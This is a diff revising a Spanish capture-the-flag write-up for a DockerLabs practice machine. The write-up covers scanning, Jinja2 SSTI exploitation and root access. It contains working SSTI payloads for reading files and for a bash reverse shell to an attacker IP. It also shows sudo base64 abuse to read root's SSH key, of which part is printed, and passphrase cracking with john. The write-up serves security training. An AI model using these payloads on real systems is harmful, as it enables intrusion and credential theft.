@@ -2,12 +2,14 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #ssti #password-cracking
+- Tags: #ssti #jinja2 #ssh-key-cracking #password-cracking
 
 ![](assets/Pasted%20image%2020251110164053.png)
+
 ## Reconocimiento
 
-Comienzo tirando un ping para comprobar conectividad
+Comienzo tirando un ping para comprobar la conectividad.
+
 ```bash
 > ping -c1 172.17.0.2
 PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
@@ -18,16 +20,13 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.224/0.224/0.224/0.000 ms
 ```
 
-- Por el ttl asumo que es una maquina linux
+- El TTL de 64 indica que estamos ante una máquina Linux.
 
-Ahora realizo un escaneo con nmap para ver que puertos están abiertos:
+Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.
+
 ```bash
 > nmap -p- -sS --open -Pn -n --min-rate 5000 172.17.0.2
 ------------------------------------------------------------
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 16:46 CST
-Nmap scan report for 172.17.0.2
-Host is up (0.000010s latency).
-Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
@@ -35,9 +34,10 @@ PORT     STATE SERVICE
 MAC Address: 06:72:90:D3:81:3F (Unknown)
 ```
 
-- Puerto 80 HTTP, 22 SSH y 8089
+- Puertos 22, 80 y 8089 abiertos.
 
-Procedo a realizar un segundo escaneo sobre los puertos abiertos para descubrir las versiones y servicios que están corriendo.
+Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.
+
 ```bash
 > nmap -p 22,80,8089 -sCV -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2 -oN target.txt
 ---------------------------------------------------------------------------------------
@@ -54,56 +54,66 @@ PORT     STATE SERVICE REASON         VERSION
 |_http-title: Apache2 Debian Default Page: It works
 |_http-server-header: Apache/2.4.59 (Debian)
 8089/tcp open  unknown syn-ack ttl 64
-| fingerprint-strings: 
 ```
 
-- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u2
-- Puerto 80 HTTP: Apache httpd 2.4.59
-- Puerto 8089: No pudo detectar el servicio que corre 
-
-
+- Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u2
+- Puerto 80 HTTP Apache httpd 2.4.59
+- Puerto 8089: Servicio desconocido
 
 ## Enumeración
 
-**Puerto 80**
+### Puerto 80 HTTP
 
-- Pagina default de apache, nada interesante
+La página principal muestra la página por defecto de Apache2 sin contenido relevante.
 
-**Puerto 8089**
+### Puerto 8089
 
-Al momento de acceder por el navegador al puerto 8089 me encuentro con una pagina web. Por lo cual decido usar whatweb para identificar que tecnologías corre por detras.
+Al acceder al puerto 8089 desde el navegador encuentro una aplicación web. Utilizo `whatweb` para identificar las tecnologías.
 
-- La web corre con Python 3.11.2 
 ```bash
 > whatweb http://172.17.0.2:8089/
 http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
 ```
 
+- La aplicación corre con **Python 3.11.2** y **Werkzeug 2.2.2** (framework Flask).
+
 ![](assets/Pasted%20image%2020251110165559.png)
 
-- Probando la app me doy cuenta que el input del usuario se ve reflejado en la web.
-- El parametro ?user= si lo cambiamos también se ve reflejado en la web.
+Probando la aplicación noto que el input del usuario se refleja en la página. El parámetro `?user=` también se refleja en la respuesta.
+
 ![](assets/Pasted%20image%2020251110165824.png)
 
-Sabiendo que la web corre en python y el input del usuario se ve reflejado y es lo único que cambia de manera dinámica en la web, esto me hace pensar que puede que por detrás haya un framework como Flask o Django que emplee algún motor plantillas cono Jinja2 u otro que pueda ser vulnerable a SSTI.
+Sabiendo que la aplicación corre en Python y que el input del usuario se refleja dinámicamente, sospecho que podría estar utilizando un motor de plantillas como **Jinja2**, lo cual podría ser vulnerable a **SSTI (Server-Side Template Injection)**.
 
 ## Explotación
 
-Lo primero que intentamos fue cambiar el parametro `?user=` por una operatoria simple para comprobar si la web la interpretaba y realizaba correctamente.
+### Server-Side Template Injection (SSTI)
 
-`{{7*7}}`
+Pruebo con una operación matemática simple para confirmar si la aplicación interpreta expresiones de plantilla.
+
+```
+{{7*7}}
+```
 
 ![](assets/Pasted%20image%2020251110170230.png)
 
-Ahora sabiendo que en efecto la web es vulnerable a SSTI y que corre en Python mi primer approach fue buscar payloads que me permitieran leer archivos internos como /etc/passwd que sirvieran para el motor de plantillas de Jinja2.
+La aplicación evalúa la expresión y devuelve `49`, confirmando la vulnerabilidad SSTI.
+
+### Lectura de Archivos con SSTI
+
+Busco payloads para Jinja2 que permitan leer archivos del sistema. Utilizo el siguiente payload para leer `/etc/passwd`.
+
 ```python
 > {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-Aquí me di cuenta que existe un usuario llamado _verde_
 ![](assets/Pasted%20image%2020251110170620.png)
 
-Ahora procedí a denuevo buscar algún payload pero ahora que me permitiera entablarme una reverse shell.
+- Descubro un usuario llamado `verde`
+
+### Reverse Shell mediante SSTI
+
+Busco un payload que me permita ejecutar comandos y establecer una reverse shell.
 
 ```bash
 > {{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"', shell=True) }}
@@ -111,23 +121,26 @@ Ahora procedí a denuevo buscar algún payload pero ahora que me permitiera enta
 
 ![](assets/Pasted%20image%2020251110171843.png)
 
-Me pongo en escucha:
+Me pongo en escucha en mi máquina atacante.
+
 ```bash
 > sudo nc -nlvp 443
+listening on [any] 443 ...
 ```
 
-Ejecuto el payload y obtengo acceso.
+Ejecuto el payload y obtengo acceso al sistema.
+
 ```bash
+Connection received on 172.17.0.2 45678
 verde@d56c80ae05a3:~$ whoami
 verde
 verde@d56c80ae05a3:~$ id
 uid=1000(verde) gid=1000(verde) groups=1000(verde)
 ```
+
 ## Escalada de Privilegios
 
-Dentro del sistema lo primero que hago es enumerar los binarios con privilegios de SUDO o algun otro usuario.
-
-- Binario bas64
+Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.
 
 ```bash
 verde@d56c80ae05a3:~$ sudo -l
@@ -135,29 +148,35 @@ User verde may run the following commands on d56c80ae05a3:
     (root) NOPASSWD: /usr/bin/base64
 ```
 
+- Puedo ejecutar `base64` como root sin contraseña.
 
-Anteriormente en la fase de reconocimiento descubrimos que el puerto 22 estaba abierto.
+### Lectura de Clave SSH de Root
 
-Entonces es posible que el usuario root tenga una clave `rsa` a la cual yo puedo acceder aprovechandome del binario `base64`. Bascimante voy a codificar la clave y decodificarla como el usario root.
+Durante el reconocimiento descubrimos que el puerto 22 (SSH) está abierto. Es posible que el usuario root tenga una clave SSH privada. Puedo leerla aprovechando el binario `base64`.
+
 ```bash
 > sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
-sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAHul0xZQ
 r68d1eRBMAoL1IAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBB
 VRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KME
+...
 ```
 
-Ahora procedo a guardarme la clave en mi sistema y darle permisos
+Guardo la clave en mi sistema y ajusto los permisos.
 
-- Aqui me doy cuenta de que tiene contraseña
 ```bash
 > chmod 600 root-key
 > ssh -i root-key root@172.17.0.2
-Enter passphrase for key 'root-key': 
+Enter passphrase for key 'root-key':
 ```
 
-Por lo cual ahora procedo a tratar de romper la contraseña john
+La clave SSH está protegida con contraseña.
+
+### Cracking de la Contraseña SSH
+
+Utilizo `ssh2john` para extraer el hash y `john` para crackearlo.
+
 ```bash
 > ssh2john root-key > hash
 > sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
@@ -167,18 +186,19 @@ root-key:honda1
 
 ![](assets/Pasted%20image%2020251110175319.png)
 
-- Encuentro la clave: root-key:honda1
+- Contraseña encontrada: `honda1`
 
-Ahora simplemente me conecto con la clave rsa y contraseña
+Me conecto por SSH con la clave privada y la contraseña.
+
 ```bash
 > ssh -i root-key root@172.17.0.2
-Enter passphrase for key 'root-key': 
+Enter passphrase for key 'root-key': honda1
 root@d56c80ae05a3:~# whoami
 root
 root@d56c80ae05a3:~# id
 uid=0(root) gid=0(root) groups=0(root)
-root@d56c80ae05a3:~# 
 ```
+
 ![](assets/Pasted%20image%2020251110175431.png)
 
-***PWNED**
+***PWNED***
